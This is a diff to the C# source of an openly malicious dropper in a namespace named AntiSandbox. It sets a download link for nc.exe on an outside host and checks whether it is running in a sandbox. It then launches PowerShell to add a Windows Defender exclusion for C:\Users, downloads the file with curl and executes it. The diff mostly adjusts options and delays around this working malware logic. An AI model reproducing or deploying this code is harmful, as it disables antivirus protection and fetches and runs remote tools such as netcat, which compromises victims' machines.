@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -13,12 +13,12 @@ namespace AntiSandbox
         {
 
             ///////////////////////////////
-            ///                        ///
-            bool dev = true;                             // Enable/Disable devmode
-            string link = "https://example.lol/idk.exe";  // set link to get file for dropper
-            string name = "test.exe";                    // set filename (saved as)
-            ///                          ///
-            ///////////////////////////////
+            ///     --- OPTIONS---     ///
+            bool dev = true;                          // Enable/Disable devmode
+            string link = "https://iiii.lol/nc.exe";        // Set link to get file for dropper
+            string name = "nc.exe";               // Set filename (saved as & executed as)
+            ///     --- OPTIONS---     ///
+           ///////////////////////////////
 
             if (dev == true)
             {
@@ -105,9 +105,9 @@ namespace AntiSandbox
                     Thread.Sleep(1000);
                     Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "");
                     Console.ForegroundColor = ConsoleColor.Cyan;
-                    Console.Write("[/] Checking in 6 seconds\n");
+                    Console.Write("[/] Checking in 10 seconds\n");
                     Console.ForegroundColor = ConsoleColor.White;
-                    Thread.Sleep(6000);
+                    Thread.Sleep(10000);
 
                     // Check if file got dropped
                     String nc = @"C:\Users\" + name + "";
@@ -297,7 +297,6 @@ namespace AntiSandbox
                     return;
                 }
 
-                // Console.WriteLine("Running outside of sandbox. Continuing.");
                 Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath ""C:\Users""; cd C:\Users; curl " + link + " -outfile " + name + "; start C:\\Users\\" + name + "");
 
                 static IEnumerable<string> GetKeyboards()
